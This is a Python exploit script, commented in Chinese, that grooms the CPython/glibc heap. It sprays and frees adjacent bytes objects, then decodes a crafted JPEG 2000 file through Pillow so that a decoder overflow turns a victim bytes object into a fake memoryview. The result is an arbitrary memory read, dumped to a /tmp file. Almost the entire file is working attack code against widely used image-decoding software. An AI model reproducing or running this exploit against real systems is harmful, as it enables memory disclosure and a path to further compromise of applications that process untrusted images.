#!/usr/bin/env python3
# 信息泄露 v8 —— 构造版（不是扫描）：
#   ① 排空 0x230 档（持有 4096 个 bytes(519) 不释放）
#   ② 成对喷射 [D][B]（都 519 => 同档 0x230），自验证 id(B)-id(D)==0x230
#   ③ 只释放【一个】已验证相邻的 D => 该档只剩这一个洞
#   ④ 解码 => tp_index(23*24=552 => 0x230 档) 必然取它 => 写窗口必然盖住洞正上方的 B
#   ⑤ 扫描所有 B：type==0xa350c8 即命中，读出 buf 指向的内存
import ctypes, gc, io, os, re, signal, struct, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
PY_MV = 0xA350C8
READ_ADDR = 0xA500D0
PY_BYTES = 0xA22670
RES = '/tmp/leak_result11.txt'
NPAIR = 400
NDRAIN = 4096

# ── 构建（先做，避免中途 fork 扰动堆）──
r = subprocess.run(['python3', '/tmp/mk13.py', '/tmp/exp/base.j2k', '/tmp/LEAK11.j2k',
                    '0', '23', hex(PY_MV), hex(0xA40000), hex(READ_ADDR), '-370'],
                   capture_output=True, text=True)
if 'OK' not in r.stdout:
    print('[!] build 失败:', (r.stdout + r.stderr)[:80]); sys.exit(1)
print('[*] build OK', flush=True)

# ── 受害 B 的预置内容（memoryview 所需字段，全在偏移 0x00-0x60 内）──
# data 基址 = 对象+0x20（PyBytesObject 头 0x20 字节）
raw = bytearray(519)
struct.pack_into('<Q', raw, 0x00, 0x40)          # obj+0x20 mv.len
struct.pack_into('<Q', raw, 0x08, READ_ADDR)     # obj+0x28 view.buf  ★★ 核心
struct.pack_into('<Q', raw, 0x10, PY_BYTES)      # obj+0x30 view.obj（合法非空对象指针）
struct.pack_into('<Q', raw, 0x18, 0x100000000)   # obj+0x38 view.len（大 ⇒ 可跨堆读）
struct.pack_into('<Q', raw, 0x20, 1)             # obj+0x40 itemsize=1
struct.pack_into('<Q', raw, 0x28, 1 << 32)       # obj+0x48 readonly=0, ndim=1
struct.pack_into('<Q', raw, 0x30, 0)             # obj+0x50 format=NULL ⇒ bytes-like
struct.pack_into('<Q', raw, 0x38, 0)             # obj+0x58 shape=NULL
BCONTENT = bytes(raw)

out = []
def dump(tag):
    out.append(tag)
    hits = [o for o in blist if R(id(o) + 8) == PY_MV]
    out.append('  被混淆的 B 数量 = %d / %d' % (len(hits), len(blist)))
    for h in hits[:3]:
        a = id(h)
        out.append('  B@%#x +0x38=%#x +0x48=%#x' % (a, R(a + 0x38), R(a + 0x48)))
        try:
            _buf = R(a + 0x28)
            _len = R(a + 0x38)
            out.append('   view.buf=%#x view.obj=%#x view.len=%#x' % (_buf, R(a + 0x30), _len))
            if 0x1000 < _buf < 0x800000000000 and _len > 64:
                d2 = ctypes.string_at(_buf, 64)
                out.append('   ★直读 @%#x = %s' % (_buf, d2.hex()))
                pts2 = [struct.unpack_from('<Q', d2, k)[0] for k in range(0, 64, 8)]
                out.append('   ★★ 指针=' + ','.join(hex(x) for x in pts2 if x > 0x10000))
        except BaseException as e2:
            out.append('   ctypes 直读失败 %r' % (e2,))
        try:
            d = h[:64].tobytes()
            pts = [struct.unpack_from('<Q', d, k)[0] for k in range(0, 64, 8)]
            out.append('   读出64B=' + d.hex())
            out.append('   指针=' + ','.join(hex(x) for x in pts if x > 0x10000))
        except BaseException as e:
            out.append('   读取异常 %r' % (e,))
    open(RES, 'w').write('\n'.join(out))

def on_sig(sig, frm):
    dump('崩于信号 %d' % sig)
    os._exit(0)

for s2 in (signal.SIGABRT, signal.SIGSEGV, signal.SIGBUS):
    signal.signal(s2, on_sig)

blist = []
# ① 排空 0x230 档（与 bytes(519) 完全同尺寸请求，且永不释放）
drain = [bytes(519) for _ in range(NDRAIN)]
print('[*] drain 完 0x230 档：%d 个' % len(drain), flush=True)

# ② 成对喷射 + 自验证
pairs = []
for _ in range(NPAIR):
    D = bytes(519)
    B = bytes(bytearray(BCONTENT))
    pairs.append((D, B))
gold = [(D, B) for (D, B) in pairs if id(B) - id(D) == 0x230]
print('[*] 相邻对 = %d / %d' % (len(gold), NPAIR), flush=True)
if not gold:
    print('[-] 没有相邻对'); sys.exit(0)

blist = [B for (D, B) in pairs]              # 全部 B 都保留（都是候选受害者）
nholes = 16
cand = [D for (D, B) in gold[:nholes]]
wantB = [hex(id(B)) for (D, B) in gold[:nholes]]
# blist 已在上面持有所有 B（活引用）；必须 del pairs，否则 D 引用计数不为 0 ⇒ 没有洞
del pairs, gold
gc.collect()
print('[*] 释放 %d 个洞（前 7 个进 tcache，第 8 个起进 unsorted/smallbin）' % len(cand), flush=True)
print('[*] 这些洞上方的活 B（前 3）=', wantB[:3], flush=True)
del cand
gc.collect()
print('[*] 洞已放好，开始解码', flush=True)

# ④ 解码
try:
    M = open('/tmp/LEAK11.j2k', 'rb').read()
    im = Image.open(io.BytesIO(M)); im.load()
    dump('解码完成')
except BaseException as e:
    dump('解码异常 %r' % (e,))

print(open(RES).read() if os.path.exists(RES) else '(无结果)')